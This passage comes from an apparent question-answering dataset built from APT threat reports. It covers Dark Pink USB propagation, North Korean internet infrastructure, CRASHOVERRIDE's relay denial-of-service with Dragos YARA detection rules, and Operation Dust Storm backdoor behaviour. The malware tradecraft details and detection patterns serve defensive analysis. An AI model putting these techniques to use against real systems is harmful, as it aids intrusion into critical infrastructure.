files is a legitimate file with a valid digital signature. The functionality of the DLL file is to unpack the original executable from file Dism.sys.\n3. Archive is extracted to %tmp% folder. The files are then copied to the USB device, where a new folder named \"dism\" is created. The folder attribution is changed to hidden and system.\n4. A file named system.bat is created, containing a command to launch Dism.exe\n5. Finally, as many LNK files are created as there are folders on the USB drive. The attributes of the original folder are changed to hidden and system. A LNK file is created with a command to open the hidden folder in explorer.exe and launch system.bat.\nFollowing this process, the user will see LNK files bearing the same name as folders found on the USB device. Once the user opens this malicious LNK file, TeleBotDropper will be launched by the DLL Side-Loading technique (the functionalities of TeleBotDropper have been already shown in the previous section). As a result, the commands, which read registry key, decrypt, and launch TelePowerBot, are then transferred to a new machine. It is imperative to remember that this solution works if there is only one folder on the USB device. This is why we observed different implementations, for example, the creation of LNK files instead of .pdf files (not only for folders) on USB devices. An example of how this works in more detail is provided in APPENDIX B. The mechanism of creating LNK files in place of the original files is also used for network sharing.\n\nBased on the above text, answer a question. How does Dark Pink achieve persistence using the ISO image infection chain, and what role does the .abcd file extension play in this process?",
    "output": "Dark Pink achieves persistence by sending an ISO image via spear-phishing emails, which contains a malicious DLL file named TelePowerDropper. This DLL file gains persistence for TelePowerBot in the registry of the infected machine. The DLL file is packed and decrypts itself upon launch, creating a mutex and adding a command to autorun TelePowerBot. The .abcd file extension is used as part of an Event Triggered Execution technique. When a file with this extension is created, it triggers a PowerShell command that reads a registry key, decrypts it, and launches TelePowerBot.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Small Headline: North Korean infrastructure\nNorth Korea's cyber infrastructure is divided into two major parts: an outward-facing Internet connection and a regime-controlled intranet. North Korea's outward-facing Internet connection is only available to select individuals and is closely monitored for any activity that is deemed anti-regime. Individuals using the outward-facing Internet connection must be authorized. In 2013, Jean H. Lee, the Associated Press bureau chief in Pyongyang, stated that foreigners visiting North Korea are allowed Internet access with no firewalls.56 Common citizens are limited to using the Kwangmyong (gwang me-young), a nationwide intranet with no access to the world outside North Korea. 57 According to Lee, Kwangmyong allows citizens \"access to the state media, information sources that are vetted by the government, and picked and pulled from the Internet and posted to their intranet site.\"58 As of May 2013, North Korea had only one \"Internet caf\u00e9.\"59 A 2003 report from the Office of the National Counterintelligence Executive stated that North Korea's \"Internet caf\u00e9\" was \"the only place in North Korea for the public to access the Internet\" and that foreigners were allowed to access the Internet from this caf\u00e9.60 Whether citizens are allowed to access the Internet from this location is unknown.\nStar Joint Venture Co. is responsible for providing North Korea's Internet access. Star Joint Venture Co. was established by the Post and Telecommunications Corporation in cooperation with Loxley\nPacific in Thailand.61 In December 2009, Star Joint Venture became responsible for North Korea's Internet address allocation. Previously, Internet access was provided by a German satellite link via Korea Computer Center Europe or via direct connections with China Netcom, which was later merged into China Unicom. 62 By October 2010, North Korea had made its first known direct connection to the Internet, hosting an outward-facing Korean Central News Agency website accessible from the global Internet. 63 However, many of North Korea's globally accessible websites are hosted in other countries. In 2001, South Korean reports indicated that North Korea had joined the International Telecommunications Satellite Organization (INTELSAT).64 As of April 2012, North Korea reportedly used the Intelsat connection, which appeared in border gateway protocol (BGP) announcements.65 Some reports referred to the Intelsat connection as North Korea's backup Internet connection, in case the China Unicom connection fails.66 A March 2013 post on the blog rdns.im showed that North Korea no longer used the Intelsat connection. In the blog post, the author noted his method for proving that The Pirate Bay was not hosted in North Korea. While his analysis of The Pirate Bay's hosting is irrelevant to our research, he did detail that 175.45.177.0/24 always routes through AS4837, and AS131279. AS131279 is Star-KP, North Korea's Star Joint Venture Company, and AS4837 is China Unicom. The author concluded that \"all [traffic] is ONLY routed through China Unicom and NOT through Intelsat.\"67 In February 2014, North Korean and South Korean officials agreed to extend Internet access to Kaesong Industrial Zone, a jointly operated industrial complex just north of the border. However, this would likely require a major electrical and network infrastructure expansion.68\n53 http://www.ncnk.org/resources/briefing-papers/all-briefing-papers/an-overview-of-south-korea2019s-dprk-policy\n54 http://www.un.org/News/Press/docs/2013/sc10934.doc.htm\n55 http://www.ncnk.org/resources/briefing-papers/all-briefing-papers/an-overview-of-south-korea2019s-dprk-policy\n56 http://www.austinchronicle.com/daily/sxsw/2013-03-11/social-media-in-north-korea/\n57 http://www.computerworld.com/s/article/9177968/North_Korea_moves_quietly_onto_the_Internet?taxonomyId=18&pageNumber=2\n58 http://www.austinchronicle.com/daily/sxsw/2013-03-11/social-media-in-north-korea/\n59 http://www.washingtonpost.com/blogs/worldviews/wp/2013/01/29/north-koreans-shouldnt-count-on-using-the-new-google-maps/\n60 http://www.ncix.gov/publications/archives/docs/NORTH_KOREA_AND_FOREIGN_IT.pdf\nNorth Korea's electrical grid cannot support a large technological infrastructure.69 Electrical power is reported to be unreliable and sporadic, with many citizens only receiving a few hours of electricity per day.70\n61 http://www.northkoreatech.org/2011/05/19/more-details-on-star-joint-venture/\n62 http://www.computerworld.com/s/article/9177968/North_Korea_moves_quietly_onto_the_Internet?taxonomyId=18&pageNumber=2\n63 http://www.northkoreatech.org/2010/10/09/the-new-face-of-kcna/\n64 http://webcache.googleusercontent.com/search?q=cache:http://english.chosun.com/site/data/html_dir/2001/05/29/2001052961197.html\n65 http://www.northkoreatech.org/2012/04/08/dprk-gets-second-link-to-internet/\n66 http://www.computerworld.com/s/article/9237652/North_Korea_39_s_Internet_returns_after_36_hour_outage\n67 https://rdns.im/the-pirate-bay-north-korean-hosting-no-its-fake-p2\n68 http://www.northkoreatech.org/2014/02/10/internet-coming-to-kaesong-industrial-zone/\n69 http://38north.org/2010/09/speak-loudly-and-carry-a-small-stick-the-north-korean-cyber-menace/\n70 http://www.usnews.com/news/blogs/rick-newman/2013/04/12/heres-how-lousy-life-is-in-north-korea\nThe photo above (Figure 3), from the International Space Station, shows North Korea's sparse power grid, in comparison with surrounding nations.71 We have highlighted North Korea in red.\nKoryolink, the country's only cellular phone network,72 is tightly controlled by the regime.73 Cell phone data plans are not available to most users. Most cellular phones cannot access the Internet and can only make domestic calls.74 According to a 2013 report, North Korea has a 3G data network for cellular phones. Visiting reporter Jean H. Lee purportedly used this 3G network to post to both Twitter and Instagram. However, citizens are not generally allowed to use the 3G network.75\nEmail is also regulated by the regime. The first email provider in North Korea was Silibank. Silibank has servers in Pyongyong and Shenyang and is a joint venture with China. The North Korean Silibank homepage is silibank.net, and the Chinese homepage is silibank.com. In order to use the email service, users had to initially register, provide personal information, and pay a registration fee and monthly service fees.76 This registration information was current as of 2001. However, it is unknown whether the same process still applies.\nWHOIS records for silibank.net show that the site was registered anonymously via a Japanese registrar. This information can be found in at the end of this paper.\n71 http://www.citylab.com/work/2014/02/north-korea-night-looks-big-black-hole/8484/\n72 http://www.northkoreatech.org/2014/06/24/chinese-shops-offer-cheap-cellphones-to-north-koreans/\n73 (<http://www.google.com/url?q=http%3A%2F%2Fwww.defense.gov%2Fpubs%2FReporttoCongressonMilitaryandSecurityDevelopmentsInvolvingtheDPRK.pdf&sa=D&sntz=1&usg=AFrqEzfhmQPPTuRKlcewmT2M5Oj7Xmg93Q>)http://www.defense.gov/pubs/ReporttoCongressonMilitaryandSecurityDevelopmentsInvolvingtheDPRK.pdf\n74 (<http://www.google.com/url?q=http%3A%2F%2Fwww.defense.gov%2Fpubs%2FNorth_Korea_Military_Power_Report_2013-2014.pdf&sa=D&sntz=1&usg=AFrqEzefeAB_L1WH_8cmtox2f9Se3GMojQ>)http://www.defense.gov/pubs/North_Korea_Military_Power_Report_2013-2014.pdf\n75 http://www.austinchronicle.com/daily/sxsw/2013-03-11/social-media-in-north-korea/\n76 http://edition.cnn.com/2001/TECH/internet/11/07/north.korea.email.idg/index.html\nKorea Computer Center (KCC) is North Korea's leading government research center for information technology. KCC has eleven regional information centers and eight development and production centers. Other countries with KCC branch offices include China, Syria, Germany, and United Arab Emirates. KCC has a vested interest in Linux research and is responsible for the development of North Korea's national operating system, Red Star OS, which is discussed in more detail below. KCC's other projects have included a proprietary search engine, a document writer, a game called Jang-Gi, the Kwangmyong intranet, a food study program, a Korean input method editor, a pen-based English-Korean and Korean-English translator, Korean voice recognition software, a video conferencing system, a distance education system, SilverStar Paduk software, HMS Player77 , and the Samjiyon tablet. 78 In addition to research and development, KCC also monitors websites of foreign government and business entities and conducts technical reconnaissance to blueprint the technical specifications and vulnerabilities in foreign systems and technologies. KCC has also been involved in clandestine information and cyber operations, serving as a command center.79\nNorth Korea's proprietary operating system is Red Star OS. The development of this Linux-based operating system started in 2002. Red Star OS is only offered in the Korean language and features proprietary software including Naenara (a Firefox-based browser), as well as a text editor, email client, audio and video players, and games. 80 Red Star OS's keyboard layouts include Korean, English, Russian, Chinese, and Japanese. Regime ideals extend to Red Star OS. The readme file, which goes with the installation disc, reportedly includes a quote from Kim Jong-Il regarding the importance of North Korea having its own Linux-based operating system that is compatible with Korean traditions. While prior versions of Red Star were KDE-based, version 3.0 mimics Apple's OS X.81 82 This could indicate the regime leader Kim Jong Un's preference for the OS X environment, as Kim reportedly uses an iMac.83 Citizens do not need permission to obtain Red Star OS. However, the purchase of computers is heavily regulated.84 The OS's design suggests it was developed with means for the regime to monitor user activity.85\n\nQuestion: What is the role of Koryolink in North Korea's telecommunications infrastructure, and how is it regulated?\n\nAnswer:",
    "output": "Koryolink is North Korea's only cellular phone network and is tightly controlled by the regime. Most cellular phones cannot access the Internet and can only make domestic calls. Although North Korea has a 3G data network, it is not generally available to citizens. Visiting reporters have used the 3G network to post on social media platforms like Twitter and Instagram, but this access is not extended to the general population. Email services are also regulated, with the first email provider being Silibank, which required users to register, provide personal information, and pay fees.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Industrial Control System\nThe problem is even worse when it comes to control systems which are widely adopted by ENR industries, as explained by chief cyber security strategist from Computer Sciences Corporation (CSC ), Donald Purdy. Purdy, formerly a cyber official at the Department of Homeland Security, mentioned during a major security conference in San Francisco in 2012:\n\"These are older systems so they are harder to control. And for convenience and cost savings, people have connected them to the internet in order to control them from remote locations. So this is almost a perfect storm in terms of vulnerability because the nation is so dependent on these systems\u2026 This is a significant security issue for the United States and frankly for the world.\"\nIn the monthly monitor report released last September by the US Industrial Control Systems Cyber Emergency Response Team (ICS-CERT), it was also mentioned that \"the positive aspects of better connectivity were overshadowed by the introduction of significant vulnerabilities\".\nFor instance, Justin W. Clarke, a 30-year-old cyber security researcher and electric utility expert discovered two major vulnerabilities in 2012 on Siemens' RuggedCom equipment which is extensively used by companies in communicating with power stations situated in different locations.\nThe first vulnerability is essentially a secret \"back door\" which would easily allow hackers remote access into the equipment. The second vulnerability makes it possible for hackers to intercept the network traffic between operator and devices which may contain authentication credentials. Potential attackers could take advantage of such flaws to manipulate power stations or use these flaws to launch another set of attacks on a much larger scale.\nThe situation is made even worse when independent researchers release and circulate system flaws and vulnerabilities for reference and countermeasure studies. While the intention behind such documents might be good, the direct consequence is that many could now easily gain access to dangerous and powerful \"weapons\" such as the code\nof Stuxnet, which can cause immense damage to critical infrastructures.\nIn contrast to the published vulnerabilities, certain manufacturers of critical system controllers are reacting way too slowly which have resulted in research groups like Digital Bond, releasing exploits for these vulnerabilities in order to \"stimulate\" the patching and upgrading efficiency.\nWhen it comes to electrical power, technology is also a double-edged sword. While advances in smart grid technologies have helped better detect power theft and reduce power loss with smart meters been recently deployed in countries such as in Serbia and Brazil, these technologies also give rise to possibilities of their advanced functionalities being used for shady purposes.\nFor instance, two demonstrations at Security B-Sides and Black Hat conferences illustrated that hackers could basically tweak the smart metres currently in use to perform functionalities as they wish, which include changing of temperature, controlling of lighting and even cutting of power during emergencies.\nAs a side note on corporate security policies and procedures, the Saudi Aramco incident where large number of business computers were disabled, also highlighted importance of monitoring network attacks initiated by inside personnel and the potential danger of using portable storage media like thumb drives.\nMedium Headline: Categorised Active Players\nOver the years, two major shifts in trends have been observed in terms of cyber attacks.\nFirstly, the targets are shifting from individual organisations to chains of related companies. Secondly, the main components of attackers have shifted from script kiddies to criminal groups, with the latter being much more specialised and coordinated.\nSome of the major players include:\n\u2022 organised cyber criminals who are most known for mass stealing of personal identities and financial data,\n\u2022 state or corporate sponsored espionage like the Night Dragon operation which aims to steal critical intellectual and business information,\n\u2022 hacktivists such as Wikileaks, Anonymous and LulzSec who have amassed a large number of supporters and participants,\n\u2022 malicious inside personnel, as in the case of Bradley Edward Manning, a United States Army soldier who was arrested in May 2010 in Iraq on suspicion of having passed classified material to the website WikiLeaks.\nJust as attacks have evolved, companies too must evolve by re-evaluating their own ability to detect, defend and respond to cyber attacks.\nMedium Headline: Various Attack Vectors\nCyber incidents can be loosely divided into three categories. The first category is accidental events due to human error, system failure or unanticipated accidents. The second category refers to unauthorised access into networks and systems by hackers or employees. The third category does not require actual access as it usually causes denial of service or loss of data.\nAttack methods could involve complicated and coordinated efforts to beat the cyber security protection mechanism and intelligence reconnaissance, followed by social engineering techniques for acquiring of target information.\nThere are six most common types of security failings. These are shared accounts, weak passwords, lack of effective network monitoring, lack of effective Web monitoring, absence of logging and absence of log analysis. Lack of user awareness also provides more opportunities for social engineering attempts to succeed. Examples of such attempts include luring Internet users\ninto execution of malware and Spear Phishing. (See Figure 3 below).\nA group of attackers who are particularly good at social engineering is Anonymous. These hackers typically exploit easy-to-guess passwords of users or use emails to trick users into revealing confidential information or into clicking links which lead to the download of malicious software.\nHowever, Anonymous is not the only group of people who are familiar with this technique. In fact, cyber criminals and state-sponsored attackers have been practising it for a far longer time. The stakes are also bigger for them as they stand to gain a whole lot more of important information.\nEddie Schwartz, chief security officer of the security firm RSA summed it up best during a security conference in San Francisco in 2012 when he said: \"The attacks by them (Anonymous) pale in comparison to the nation-state stuff and the criminal element\u2026 The more eyes, the greater chance of success (for an attack)\", which accurately depicts the cyber environment nowadays.\nMedium Headline: Impact on companies who fall prey to such attacks\nThe objectives of cyber attacks can be divided into two distinct categories. These are\n\u2022 misappropriation and theft of intellectual property, financial data or other confidential information for monetary gain or to gain a competitive edge;\n\u2022 corruption or disturbance of key business assets and processes for strategic purposes or to make an activism statement,\nHowever, the actual impact on victim companies could be much broader and more profound.\nMore specifically, direct consequences of such attacks comprise disruption of business and production processes, unauthorised access to monetary operation, loss of intellectual property, disclosure of merger-and-acquisition\ndeals, identity theft and compromising of customer data. Such attacks can also adversely affect third party partners in the industrial chain. (See Figure 4 below).\nBut all the above consequences are just the tip of the iceberg. Deeper financial and reputational impact further includes loss of competitive advantage in accessing new fields, failure to keep current clients and investors, losing deals and disputes (or winning them on unfavourable terms), regulatory fines, liability lawsuits, share price drops, costs involved in fixing business relationships and even negative international publicity.\nIn addition, the company would very likely be forced to spend more than usual to fix systems and repair damages. It is also very likely that costly fees will be incurred from services of third party experts and consultants for mitigation and recovery services. There could also be forced expenditure on personnel change, organisational restructuring and additional training.\nSource: 2012 KPMG paper \"A nuanced perspective on cybercrime\".\n\nQ: How has the evolution of cyber attacks changed over the years, and what are the major players involved in these attacks?",
    "output": "A: Over the years, two major shifts in cyber attack trends have been observed. Firstly, the targets have shifted from individual organizations to chains of related companies. Secondly, the main components of attackers have shifted from script kiddies to criminal groups, which are more specialized and coordinated. Major players include organized cyber criminals known for stealing personal identities and financial data, state or corporate-sponsored espionage like the Night Dragon operation, hacktivists such as Wikileaks, Anonymous, and LulzSec, and malicious insiders like Bradley Edward Manning.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: Using CVE-2015-5374 to Hamper Protective Relays\nA second, and more severe, amplifying attack would be to neutralize the automated protective system by creating a Denial of Service against some or all of the protective relays. This possibility exists in a tool ESET has claimed to have discovered that implements the known CVE-2015-5374 Denial of Service condition to the Siemens SIPROTEC relays. Siemens released a patch for this in July 2015 under Siemens advisory SCA-732541. At this time it is believed that CVE-2015-5374 causes a denial of service (DoS) of the complete relay functionality and not just the network communications module.  Dragos has independent evidence that this module exists but it cannot be confirmed.\nHampering the protective scheme by disabling the protective relays can broaden the islanding event and, if done at scale, could trigger a larger event causing multiple substations and lines \"islanding\" from the electric grid.  Siemens SIPROTEC was likely chosen in this attack only because that was the vendor device at the Ukraine Kiev site attacked in December 2016. This same tactic against digital relays, albeit not the same exploit, could have a similar impact on grid operations. However, there are many different types of digital relays each with different configurations. This amplifying attack would be very difficult to do at scale properly and would require a significant investment on behalf of the adversary.\nBig Headline: Defense Recommendations\nDoing the basics is always appropriate, and it significantly helps move ICS into a defensible position. However, they are not worth repeating here, and instead, more tailored approaches specific to ICS security analysts trying to defend against CRASHOVERRIDE and similar capabilities are presented below:\n\u2022 Electric utility security teams should have a clear understanding of where and how IEC 104 and IEC 61850 protocols are used.  North American electric utilities should include DNP3 on this list in case the malware is extended to impact U.S. systems. Look specifically for increased usage of the protocols against baselines established in the environment. Also, look for systems leveraging these protocols if they have not before and specifically try to identify systems that are generating new network flows using these protocols.\n\u2022 Similarly, understand OPC implementations and identify how the protocol is being used. It is a protocol that is pervasive across numerous sectors. Also, CRASHOVERRIDE is the second, out of four, ICS tailored malware suite with OPC capabilities. OPC will appear abnormal in the CRASHOVERRIDE usage as it is being used to scan all devices on the network which would generate more traffic than usual.\n\u2022 Robust backups of engineering files such as project logic, IED configuration files, and ICS application installers should be offline and tested. This will help reduce the impact of the wiper functionality.\n\u2022 Prepare incident response plans for this attack and perform table top exercises bringing in appropriate stakeholders and personnel across engineering, operations, IT, and security. The scenario should include substation outages with the requirement to do manual operations while recovering the SCADA environment and gathering appropriate forensics.\n\u2022 The included YARA rules and other indicators of compromise can be leveraged to search for possible infections (IOCs). The YARA rules will provide a higher confidence towards discovering an infection than the other IOCs and should be searched for against Windows OT systems especially noting HMIs. The behavioral analytics to identify the communications on the network would provide the highest capability to detect this and similar threats.\nWhile some defenses and architecture changes may have value in other situations, the following are responses that are not appropriate for this attack:\n\u2022 Transmission and distribution companies should not rely on the usage of other protocols such as DNP3 as a protection mechanism. The completeness of the CRASHOVERRIDE framework suggests there may be other undisclosed modules such as a DNP3 module. Also, adding this functionality into the existing framework would not require extensive work on the part of the adversary.\n\u2022 Air gapped networks, unidirectional firewalls, anti-virus in the ICS, and other passive defenses and architecture changes are not appropriate solutions for this attack. No amount of security control will protect against a determined human adversary. Human defenders are required\nMedium Headline: Yara Rules\nAlso found at https://github.com/dragosinc/CRASHOVERRIDE\nimport \"pe\" import \"hash\"\nrule dragos_crashoverride_exporting_dlls { meta:\ndescription = \"CRASHOVERRIDE v1 Suspicious Export\" author = \"Dragos Inc\" condition:\npe.exports(\"Crash\") & pe.characteristics\n}\nrule dragos_crashoverride_suspcious\n{\nmeta:\ndescription = \"CRASHOVERRIDE v1 Wiper\" author = \"Dragos Inc\" strings:\n$s0 = \"SYS_BASCON.COM\" fullword nocase wide\n$s1 = \".pcmp\" fullword nocase wide\n$s2 = \".pcmi\" fullword nocase wide\n$s3 = \".pcmt\" fullword nocase wide\n$s4 = \".cin\" fullword nocase wide\ncondition:\npe.exports(\"Crash\") and any of ($s*)\nrule dragos_crashoverride_name_search {\nmeta:\ndescription = \"CRASHOVERRIDE v1 Suspicious Strings and Export\" author = \"Dragos Inc\" strings:\n$s0 = \"101.dll\" fullword nocase wide\n$s1 = \"Crash101.dll\" fullword nocase wide\n$s2 = \"104.dll\" fullword nocase wide\n$s3 = \"Crash104.dll\" fullword nocase wide\n$s4 = \"61850.dll\" fullword nocase wide\n$s5 = \"Crash61850.dll\" fullword nocase wide\n$s6 = \"OPCClientDemo.dll\" fullword nocase wide\n$s7 = \"OPC\" fullword nocase wide\n$s8 = \"CrashOPCClientDemo.dll\" fullword nocase wide\n$s9 = \"D2MultiCommService.exe\" fullword nocase wide\n$s10 = \"CrashD2MultiCommService.exe\" fullword nocase wide\n$s11 = \"61850.exe\" fullword nocase wide\n$s12 = \"OPC.exe\" fullword nocase wide\n$s13 = \"haslo.exe\" fullword nocase wide\n$s14 = \"haslo.dat\" fullword nocase wide\ncondition:\nany of ($s*) and pe.exports(\"Crash\")\nrule dragos_crashoverride_hashes {\nmeta:\ndescription = \"CRASHOVERRIDE Malware Hashes\"         author = \"Dragos Inc\"     condition:\nfilesize < 1MB and\nhash.sha1(0, filesize) == \"f6c21f8189ced6ae150f9ef2e82a3a57843b587d\" or         hash.sha1(0, filesize) == \"cccce62996d578b984984426a024d9b250237533\" or         hash.sha1(0, filesize) == \"8e39eca1e48240c01ee570631ae8f0c9a9637187\" or         hash.sha1(0, filesize) == \"2cb8230281b86fa944d3043ae906016c8b5984d9\" or         hash.sha1(0, filesize) == \"79ca89711cdaedb16b0ccccfdcfbd6aa7e57120a\" or         hash.sha1(0, filesize) == \"94488f214b165512d2fc0438a581f5c9e3bd4d4c\" or        hash.sha1(0, filesize) == \"5a5fafbc3fec8d36fd57b075ebf34119ba3bff04\" or         hash.sha1(0, filesize) == \"b92149f046f00bb69de329b8457d32c24726ee00\" or         hash.sha1(0, filesize) == \"b335163e6eb854df5e08e85026b2c3518891eda8\"\n}\nBig Headline: YARA Rules\nrule dragos_crashoverride_configReader\n{\n}\nrule dragos_crashoverride_weirdMutex\n{\nmeta:\ndescription = \"Blank mutex creation assoicated with CRASHOVERRIDE\"        author = \"Dragos Inc\"     strings:\n85 c0 }        $s1 = { 81 ec 08 02 00 00 57 33 ff 57 57 57 ff 15 ?? ?? 40 00 a3 ?? ?? ?? 00         $s2 = { 8d 85 ?? ?? ?? ff 50 57 57 6a 2e 57 ff 15 ?? ?? ?? 00 68 ?? ?? 40 00}    condition:\nall of them\n}\nrule dragos_crashoverride_serviceStomper\n{\nmeta:\ndescription = \"Identify service hollowing and persistence setting\"        author = \"Dragos Inc\"     strings:\n$s0 = { 33 c9 51 51 51 51 51 51 ?? ?? ?? }\n$s1 = { 6a ff 6a ff 6a ff 50 ff 15 24 ?? 40 00 ff ?? ?? ff 15 20 ?? 40 00 }    condition:\nall of them\n}\nrule dragos_crashoverride_wiperModuleRegistry\n{\nmeta:\ndescription = \"Registry Wiper functionality assoicated with CRASHOVERRIDE\"        author = \"Dragos Inc\"     strings:\n$s0 = { 8d 85 a0 ?? ?? ?? 46 50 8d 85 a0 ?? ?? ?? 68 68 0d ?? ?? 50 }\n$s1 = { 6a 02 68 78 0b ?? ?? 6a 02 50 68 b4 0d ?? ?? ff b5 98 ?? ?? ?? ff 15 04 ?? ?? ?? }\n$s2 = { 68 00 02 00 00 8d 85 a0 ?? ?? ?? 50 56 ff b5 9c ?? ?? ?? ff 15 00 ?? ?? ?? 85 c0 }     condition:\nall of them\n}\nrule dragos_crashoverride_wiperFileManipulation\n{\nmeta:\ner\"        description = \"File manipulation actions associated with CRASHOVERRIDE wip-\nauthor = \"Dragos Inc\"     strings:\n$s0 = { 6a 00 68 80 00 00 00 6a 03 6a 00 6a 02 8b f9 68 00 00 00 40 57 ff 15 1c ?? ?? ?? 8b d8 }        $s2 = { 6a 00 50 57 56 53 ff 15 4c ?? ?? ?? 56 }     condition:\nall of them\n}\n\nHow does the CRASHOVERRIDE framework leverage CVE-2015-5374 to amplify its attack on electric grid operations?",
    "output": "The CRASHOVERRIDE framework uses CVE-2015-5374 to create a Denial of Service (DoS) condition against Siemens SIPROTEC relays. This vulnerability causes a DoS of the complete relay functionality, not just the network communications module. By neutralizing the automated protective system through this DoS attack, the adversary can disable protective relays, broadening the islanding event and potentially triggering a larger event that causes multiple substations and lines to 'island' from the electric grid. This tactic, if done at scale, could have a significant impact on grid operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Here and Now: Companies Compromised\nActivity in 2015 was significantly more interesting, and prompted SPEAR to begin studying Operation Dust Storm's other activities. SPEAR identified a number of second-stage backdoors with hardcoded proxy addresses and credentials. These proxy addresses revealed the attacker had compromised a number of Japanese companies involved in power generation, oil and natural gas, construction, finance, and transportation.\nIn one case that transpired in early February 2015, SPEAR was able to recover the second-stage implant delivered by a variant of the S-Type backdoor shortly following its initial reconnaissance. What caught our attention was the fact that the victim was part of the investment arm of a major Japanese automaker. The attack came just two weeks before eleven unions representing Japan's autoworkers demanded a monthly\nraise of six thousand yen. (http://www.bloomberg.com/ news/articles/2015-02-18/japan-auto-workers-seek-pay-raise-to-share-in-record-car-profits)\nThe second-stage implants were also programmed and compiled using Microsoft Visual Studio 6, an archaic version of Visual Studio that seems to be preferred by malware authors. Despite using an old version of Visual\nStudio, the backdoor is well designed by comparison and provides a full suite of functionality to the attacker.\nSmall Headline: No antivirus vendors seem to reliably detect most of the variants SPEAR identified.\nPerhaps even more interesting was the fact that the group adopted and eventually customized several Android backdoors to suit their purposes in the beginning of 2015. The group rapidly expanded their mobile operations in May 2015. The initial backdoors were relatively simple, and would continually forward all SMS messages and call information back to the C2 servers. Later variants became much more complex, and included the ability to enumerate and exfiltrate specific files directly from the infected devices.\nAll of the identified victims for the Android Trojans resided in Japan or South Korea. The infrastructure to support\nthe Android campaigns was massive in comparison to previous operations. More than two hundred domains have been identified to date. SPEAR plans to release more information regarding this threat shortly.\nSPEAR discovered two more waves of attacks that started in July 2015 and October 2015. Interestingly, one of the primary targets was a Japanese subsidiary of a South Korean electric utility. Similarly, SPEAR identified a separate intrusion into a major Japanese oil and gas company. The exact motivations for this particular attack were unclear; however, if this attack coincided with all previous operations, the most likely goals were reconnaissance and long-term espionage.\nMedium Headline: CONCLUSION\nAt this time, SPEAR does not believe the attacks were meant to be destructive or disruptive. However, our team believes that attacks of this nature on companies involved in Japanese critical infrastructure and resources are ongoing and are likely to continue to escalate in the future.\nIt's clear from SPEAR's research that Operation Dust Storm has slowly evolved over time to become increasingly effective. Early operations were extremely blunt, relatively unsophisticated, and readily picked up by the security industry. As the group became more and more focused on Japan, less and less of their tactics and malware appeared in reports or write-ups. The targets identified escalated both in size and in the scope of affected industries.\nAs a result, SPEAR felt obligated to share with the community and public what was discovered recently, to hopefully stunt the attackers' progress for a time. SPEAR has been closely following the aftermath of public reporting. We have decided that even though disclosure often forces attackers to change, it also enables defenders to better detect and expel \"real\" threats from their environments.\nSPEAR would like to thank the Japanese Computer Emergency Response Team (JP-CERT) for their cooperation, assistance, and time during our investigation.\nNOTE: A large number of the older Misdat domains were sinkholed by a private entity in late December 2015. The domains currently point to the IP address \"58.158.177.102\". If anyone has more information or knows who operates this sinkhole, please contact us at: threat-intel [at] cylance [dot] com.\nMedium Headline: MISDAT BACKDOOR (2010-2011)\nMost early samples of Misdat were not packed; however, following what appeared to be heightened awareness by security vendors, samples in late 2010 and 2011 were typically packed with the executable packer, UPX version 3.03 (hxxp://upx. sourceforge.net/). All of the Misdat samples SPEAR identified were programmed using Borland Delphi, which will mangle the default PE compile timestamp of a file; as a result, SPEAR was forced to use the resource compile times of samples to get a better idea of when the actual backdoors were compiled.\nMedium Headline: NETWORK-BASED INDICATORS\nObserved network traffic was always base64 encoded plain text over a raw socket to common ports like 80, 443, or 1433. A sample initial beacon packet is shown below.\nlogon|{Hostname}|Windows XP|100112|bd56d32fbda703a98c87689c92325d90|\nFigure 6: Initial Beacon Packet Base64 Decoded\nThe string \"logon\" always preceded any other information. In the instance above, the hostname of the victim's system, operating system version, unique sample identifier (SPEAR believes this is a date: 1/12/2010), as well as the unique MD5 used for the mutex were sent to the server. Once it registers with the C2, the backdoor sends the string \"YWN0aXZlfA==\" which decodes to \"active|\". The backdoor will then continue to send that string and wait until it receives one of the following commands from the C2 server:\nMedium Headline: DETAILS\nThe backdoors were relatively simple and provided the attacker the ability to upload and download files, manipulate and enumerate files, execute shell commands, disconnect from the C2, uninstall the backdoor, and shutdown or restart the system. The backdoors could also potentially take the command line parameters \"/ok\" or \"/start\"; the switches changed the user context under which the process runs. If no switch was provided when executed, the backdoor will copy itself to \"%CommonFiles%\\ {Unique Identifier}\\msdtc.exe\", where the unique identifier is the first ten characters of the MD5 hash used as the mutex. It will then configure one of the Active Setup and associated registry keys above to establish persistence on the system.\nSPEAR identified and reversed the encoding mechanism used for obfuscating network callback information and what appeared to be a unique campaign identifier. The following script can be used to decode these obfuscated strings.\nMedium Headline: MIS-TYPE HYBRID BACKDOOR (2012)\nIn 2012, Operation Dust Storm slowly migrated to a hybridized backdoor, which actually contained two entirely separate backdoors within the same binary. This backdoor would first attempt to establish an interactive shell using the Misdat base64 encoded network protocol over a raw TCP socket. If the initial communication to the first C2 failed, the backdoor would fallback to a secondary HTTP-based protocol and communicate to an alternate C2. Hybrid variants SPEAR identified were compressed with UPX version 3.03.\nSmall Headline: Volatile Evidence:\n\u2022 Will create a 32-bit Mutex based upon the MD5 hash of a unique string comprised of the volume serial number, decrypted network configuration data, encoded network configuration data, and encoded campaign identifier\n\u2022 May create a temporary user on the system named \"Lost_{Unique Identifier}\" with the password \"fuck~!@6\"{Unique Identifier}\"\n\u2022 May create the folder %System%\\{Unique Identifier} temporarily.\n\u2022 May create files in %AppData%\\{Unique Identifier} that end in \"tmp.exe\"\n\u2022 May create the files:\n\u2022 %AppData%\\{Unique Identifier}\\HOSTRURKLSR\n\u2022 Contains the results of the command \"cmd.exe /c ipconfig /all\"\n\u2022 %AppData%\\{Unique Identifier}\\NEWERSSEMP\n\u2022 Contains the results of the command \"cmd.exe /c net user {Username}\"\nFile System Modifications:\n\u2022 The backdoor will copy itself to %AppData%\\{Unique Identifier}\\msdtc.exe \u2013 where the unique identifier is the first ten characters of the MD5 hash\nRead the text above and answer this question: What was significant about the second-stage backdoors used by Operation Dust Storm in 2015, and how did they reveal the extent of the group's operations?",
    "output": "The second-stage backdoors used by Operation Dust Storm in 2015 were notable because they contained hardcoded proxy addresses and credentials. These proxies revealed that the attacker had compromised numerous Japanese companies across various sectors, including power generation, oil and natural gas, construction, finance, and transportation. This indicated the broad reach and strategic targeting of the group's operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
